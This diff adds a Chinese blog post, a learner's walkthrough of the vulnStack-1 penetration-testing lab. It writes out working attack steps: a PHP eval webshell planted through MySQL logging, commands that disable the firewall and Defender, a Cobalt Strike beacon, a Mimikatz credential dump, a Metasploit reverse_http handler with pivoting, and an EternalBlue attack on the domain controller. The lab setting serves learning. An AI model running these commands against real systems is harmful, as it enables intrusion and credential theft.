@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="vulnStack-1 前言：学学渗透，春秋云镜太贵辣，尝试下红日靶场，还没有打穿。。。。。 靶场搭建官网下载虚拟机环境：http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;detail&#x2F;2&#x2F; 靶场搭建过程参考： https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_39190897&#x2F;article&#x2F;details&#x2F;118353886 该靶场的网络拓扑图：  遇到的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透取经-vulStack1">
+<meta property="og:url" content="http://example.com/2023/04/25/%E6%B8%97%E9%80%8F%E5%8F%96%E7%BB%8F-vulStack1/index.html">
+<meta property="og:site_name" content="k4i_x3i0">
+<meta property="og:description" content="vulnStack-1 前言：学学渗透，春秋云镜太贵辣，尝试下红日靶场，还没有打穿。。。。。 靶场搭建官网下载虚拟机环境：http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;detail&#x2F;2&#x2F; 靶场搭建过程参考： https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_39190897&#x2F;article&#x2F;details&#x2F;118353886 该靶场的网络拓扑图：  遇到的">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230423151951976.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230423154128652.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230423154349718.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230423164145971.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230423165152413.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230423170835203.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230423170520610.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424010441617.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424011201489.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424011508402.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424011713237.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424194224649.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424195406949.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424195340228.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424201421970.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424202118757.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424201825436.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424212955014.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424213157701.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424213430796.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424214119508.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424215141499.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424220641489.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424221152505.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230425210633606.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424221724928.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230425223010635.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230425223036044.png">
+<meta property="article:published_time" content="2023-04-25T14:24:49.000Z">
+<meta property="article:modified_time" content="2023-04-25T14:31:10.988Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230423151951976.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>渗透取经-vulStack1</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">项目</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2023/04/17/fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1224-68/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/04/25/%E6%B8%97%E9%80%8F%E5%8F%96%E7%BB%8F-vulStack1/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/04/25/%E6%B8%97%E9%80%8F%E5%8F%96%E7%BB%8F-vulStack1/&text=渗透取经-vulStack1"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/04/25/%E6%B8%97%E9%80%8F%E5%8F%96%E7%BB%8F-vulStack1/&title=渗透取经-vulStack1"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/04/25/%E6%B8%97%E9%80%8F%E5%8F%96%E7%BB%8F-vulStack1/&is_video=false&description=渗透取经-vulStack1"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=渗透取经-vulStack1&body=Check out this article: http://example.com/2023/04/25/%E6%B8%97%E9%80%8F%E5%8F%96%E7%BB%8F-vulStack1/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/04/25/%E6%B8%97%E9%80%8F%E5%8F%96%E7%BB%8F-vulStack1/&title=渗透取经-vulStack1"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/04/25/%E6%B8%97%E9%80%8F%E5%8F%96%E7%BB%8F-vulStack1/&title=渗透取经-vulStack1"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/04/25/%E6%B8%97%E9%80%8F%E5%8F%96%E7%BB%8F-vulStack1/&title=渗透取经-vulStack1"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/04/25/%E6%B8%97%E9%80%8F%E5%8F%96%E7%BB%8F-vulStack1/&title=渗透取经-vulStack1"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/04/25/%E6%B8%97%E9%80%8F%E5%8F%96%E7%BB%8F-vulStack1/&name=渗透取经-vulStack1&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/04/25/%E6%B8%97%E9%80%8F%E5%8F%96%E7%BB%8F-vulStack1/&t=渗透取经-vulStack1"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#vulnStack-1"><span class="toc-number">1.</span> <span class="toc-text">vulnStack-1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA"><span class="toc-number">1.1.</span> <span class="toc-text">靶场搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">1.1.1.</span> <span class="toc-text">遇到的问题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">1.2.</span> <span class="toc-text">外网渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">1.3.</span> <span class="toc-text">内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cs%E4%B8%8A%E7%BA%BF"><span class="toc-number">1.3.1.</span> <span class="toc-text">cs上线</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F"><span class="toc-number">1.4.</span> <span class="toc-text">内网横向渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.5.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AE%E9%A2%98"><span class="toc-number">1.6.</span> <span class="toc-text">问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8"><span class="toc-number">1.7.</span> <span class="toc-text">工具使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.8.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        渗透取经-vulStack1
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">John Doe</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-04-25T14:24:49.000Z" itemprop="datePublished">2023-04-25</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="vulnStack-1"><a href="#vulnStack-1" class="headerlink" title="vulnStack-1"></a>vulnStack-1</h1><hr>
+<p>前言：学学渗透，春秋云镜太贵辣，尝试下红日靶场，还没有打穿。。。。。</p>
+<h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><p>官网下载虚拟机环境：<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p>
+<p>靶场搭建过程参考：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39190897/article/details/118353886">https://blog.csdn.net/weixin_39190897/article/details/118353886</a></p>
+<p>该靶场的网络拓扑图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230423151951976.png" alt="image-20230423151951976"></p>
+<h3 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h3><p>1，win7无法开启phpstudy，重启试过也不行</p>
+<p>解决方法，手动开启apache和mysql</p>
+<ul>
+<li>开启apache</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">进入C:\phpStudy\Apache\bin</span><br><span class="line"></span><br><span class="line">执行这两条命令</span><br><span class="line">httpd.exe -k install</span><br><span class="line">httpd.exe -k -n apache2.4</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230423154128652.png" alt="image-20230423154128652"></p>
+<ul>
+<li>开启mysql</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">进入：</span><br><span class="line">C:\phpStudy\MySQL\bin</span><br><span class="line">执行：</span><br><span class="line">mysqld --defaults-file=&quot;C:/phpStudy/mysql/my.ini&quot; --console --skip-grant-tables</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230423154349718.png" alt="image-20230423154349718"></p>
+<p>2，网络设置，攻击机需要与靶机在同一个网段，攻击机还要设置网关（我的win11就是因为没有设置网关而出问题，卡了半天）</p>
+<p>访问web服务，成功搭建开始渗透：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230423164145971.png" alt="image-20230423164145971"></p>
+<h2 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透"></a>外网渗透</h2><p>访问服务，是一个phpStudy 探针，可以测试链接mysql,账号密码是<code>root</code>，<code>root</code>。但是并没有什么卵用，dirsearch扫一下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230423165152413.png" alt="image-20230423165152413"></p>
+<p>弱口令，root,root进入phpMyadmin 【<a target="_blank" rel="noopener" href="https://www.cnblogs.com/liliyuanshangcao/p/13815242.html#_label1_0%E3%80%91">https://www.cnblogs.com/liliyuanshangcao/p/13815242.html#_label1_0】</a></p>
+<p>利用phpMyadmin存在的漏洞来getShell：</p>
+<p>尝试利用<code>into outfile</code>写入木马，该方法需要满下列条件：</p>
+<ul>
+<li>当前的数据库用户有写权限</li>
+<li>知道web绝对路径</li>
+<li>web路径能写</li>
+</ul>
+<p><code>SELECT @ @basedir </code>查看路径</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230423170835203.png" alt="image-20230423170835203"></p>
+<p>执行`show variables like ‘%secure%’;</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230423170520610.png" alt="image-20230423170520610"></p>
+<p>当<code>secure_file_priv</code>为NULL时，表示限制Mysql不允许导入导出，要想使得写入文件语句导出成功，则需要在Mysql文件夹下修改<code>my.ini</code> 文件，在[mysqld]内加入<code>secure_file_priv =&quot;&quot;</code> 即可，但是在phpMyadmin中无法修改<code>my.ini</code>文件，换！</p>
+<p>通过写入日志文件getshell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set global general_log = &quot;ON&quot;;</span><br><span class="line">show variables like &#x27;general%&#x27;;</span><br><span class="line">set global general_log_file = &quot;C://phpStudy//WWW//shell.php&quot;;  //分隔符要使用，否则无法写入</span><br><span class="line">select &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>这个给靶场还存在<code>ycxcms</code>也能getshell</p>
+<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><h3 id="cs上线"><a href="#cs上线" class="headerlink" title="cs上线"></a>cs上线</h3><p>1，生成cs木马，蚁剑上传</p>
+<p>先关闭防火墙</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>
+
+<p>再执行木马程序：</p>
+<p>稍等一会可以看到已经上线</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424010441617.png" alt="image-20230424010441617"></p>
+<p>拿到 <code>shell</code> 第一步，调低心跳值，默认心跳为 <code>60s</code>，执行命令的响应很慢，进入 <code>beacon</code> 执行 <code>sleep 5</code> 或者右键主机选择 <code>会话→Sleep</code>进行设置</p>
+<p>2，信息收集：</p>
+<ul>
+<li>网络信息</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell ipconfig</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424011201489.png" alt="image-20230424011201489"></p>
+<ul>
+<li>Minikatz抓本机用户密码，成功获取为<code>Qwer1234</code></li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424011508402.png" alt="image-20230424011508402"></p>
+<ul>
+<li>提权，利用 MS14-058 成功提权到 SYSTEM 系统权限账户。（看wp说的用这个洞来提权，但是我靶场搭建起来就是<code>SYSTEM</code>权限诶。先不管跟着打一遍）</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424011713237.png" alt="image-20230424011713237"></p>
+<p>###域环境信息收集</p>
+<p>内网信息收集的主要目的就是查找域控以及域内的其他主机，</p>
+<p>部分内网信息收集的命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">net view                 # 查看局域网内其他主机名</span><br><span class="line">net config Workstation   # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域</span><br><span class="line">net user                 # 查看本机用户列表</span><br><span class="line">net user /domain         # 查看域用户</span><br><span class="line">net localgroup administrators # 查看本地管理员组（通常会有域用户）</span><br><span class="line">net view /domain         # 查看有几个域</span><br><span class="line">net user 用户名 /domain   # 获取指定域用户的信息</span><br><span class="line">net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）</span><br><span class="line">net group 组名 /domain    # 查看域中某工作组</span><br><span class="line">net group &quot;domain admins&quot; /domain  # 查看域管理员的名字</span><br><span class="line">net group &quot;domain computers&quot; /domain  # 查看域中的其他主机名</span><br><span class="line">net group &quot;doamin controllers&quot; /domain  # 查看域控制器主机名（可能有多台）</span><br></pre></td></tr></table></figure>
+
+<p>1，先判断是否存在域，使用 <code>ipconfig /all</code> 查看 DNS 服务器，发现主 DNS 后缀不为空，存在域<code>god.org</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424194224649.png" alt="image-20230424194224649"></p>
+<p>2,查看有几个域（域环境可能存在多个域）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view /domain</span><br></pre></td></tr></table></figure>
+
+<p>发现只有一个域<code>GOD</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424195406949.png" alt="image-20230424195406949"></p>
+<p>3，查看域控</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain controllers&quot; /domain</span><br></pre></td></tr></table></figure>
+
+<p>直接确认域控主机的名称为 OWA</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424195340228.png" alt="image-20230424195340228"></p>
+<p>4,查看局域网内其他主机信息(主机名称、IP地址)</p>
+<p>注：用cs中的net view可以直接查看到ip</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424201421970.png" alt="image-20230424201421970"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424202118757.png" alt="image-20230424202118757"></p>
+<p>执行命令<code>net group &quot;domain computers&quot; /domain</code> 查看域中的其他主机名</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424201825436.png" alt="image-20230424201825436"></p>
+<p>内网信息收集完毕：</p>
+<ul>
+<li>域控：192.168.52.138  OWA</li>
+<li>域成员：192.168.52.141（ROOT-TVI862UBEH），192.168.52.143  （STU1已经控制的机器）</li>
+</ul>
+<p>注：扫描存活机器的时候还可以利用msf中的模块来探测</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">探测主机存活</span><br><span class="line">use post/windows/gather/arp_scanner</span><br><span class="line">set SESSION 1</span><br><span class="line">set RHOSTS 192.168.52.1-255</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<h2 id="内网横向渗透"><a href="#内网横向渗透" class="headerlink" title="内网横向渗透"></a>内网横向渗透</h2><p> 以win7为调板机，横向渗透拿下域内成员及其域控</p>
+<p>###CS派生会话给公网MSF</p>
+<p>启动msf，开启监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set lhost 192.168.14.128</span><br><span class="line">set lport 7777</span><br><span class="line">exploit </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424212955014.png" alt="image-20230424212955014"></p>
+<p>CS开启监听：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424213157701.png" alt="image-20230424213157701"></p>
+<p>CS中添加会话，选择刚刚添加的监听器，转到msf这边可以看到已近收到了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424213430796.png" alt="image-20230424213430796"></p>
+<p>msf功能强大，才学也不知可以干些什么。这里跟着师傅们的操作学学：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/checkvm   #判断是否是虚拟机(检测是否进入了蜜罐)</span><br><span class="line">run post/windows/gather/enum_applications #枚举出靶机上的应用程序</span><br><span class="line">run post/multi/manage/autoroute  #加载MSF的autoroute模块，获取当前机器的所有网段信息</span><br><span class="line">run post/multi/manage/autoroute SUBNET=192.168.52.0 ACTION=ADD #添加目标内网路由</span><br></pre></td></tr></table></figure>
+
+<p>可以看到已经检测出是虚拟机了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424214119508.png" alt="image-20230424214119508"></p>
+<p>###永恒之蓝攻击</p>
+<p>利于msf是为了借助他的攻击模块，展开横向渗透，拿下域中其他机器。</p>
+<p>####<strong>静态路由配置</strong></p>
+<p>MSF 的 autoroute 模块是 MSF 框架中自带的一个路由转发功能，实现过程是 MSF 框架在已经获取的 Meterpreter Shell 的基础上添加一条去往“内网”的路由，直接使用 MSF 去访问原本不能直接访问的内网资源，只要路由可达我们既可使用 MSF 来进行探测了。</p>
+<p>1，查看靶机网段信息</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424215141499.png" alt="image-20230424215141499"></p>
+<p>2，添加目标内网路由</p>
+<p>####<strong>MSF内网端口扫描</strong></p>
+<p>现在路由可达内网网段，可以先对内网主机进行探测。</p>
+<p>1，使用<code>auxiliary/scanner/portscan/tcp</code>模块对<code>192.168.52.141</code>和<code>192.168.52.138</code>开放的端口进行扫描（这里要先推出当前模块，使用<code>background</code>命令，获取如果要返回使用<code>sessions -i</code>即可）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#msf自带模块</span><br><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line">set rhosts 192.168.52.141</span><br><span class="line">set ports 80,135-139,445,3306,3389</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">#nmap，msf结合了nmap，可以直接里哟nmap来扫描</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424220641489.png" alt="image-20230424220641489"></p>
+<p>####<strong>使用<code>ms17-010</code>进行攻击</strong></p>
+<p>1，使用MSF 自带的漏洞扫描模块进行扫描：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search ms17_010 #搜索MSF集成的与ms17_010漏洞相关的模块</span><br><span class="line">use auxiliary/scanner/smb/smb_ms17_010 # 加载扫描exp</span><br><span class="line">set rhosts 192.168.52.141 #设置被扫描的主机IP</span><br><span class="line">run  #进行扫描，观察是否存在该漏洞</span><br></pre></td></tr></table></figure>
+
+<p>这发现都存在永恒之蓝漏洞</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424221152505.png" alt="image-20230424221152505"></p>
+<p>2，利于该漏洞拿下域控</p>
+<p>关闭跳板机防火墙：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sessions -l #查看所有会话</span><br><span class="line">sessions 4  #进入会话4中</span><br><span class="line">netsh advfirewall set allprofiles state off #关闭防火墙</span><br><span class="line">net stop windefend #关闭Windows defender</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230425210633606.png" alt="image-20230425210633606"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424221724928.png" alt="image-20230424221724928"></p>
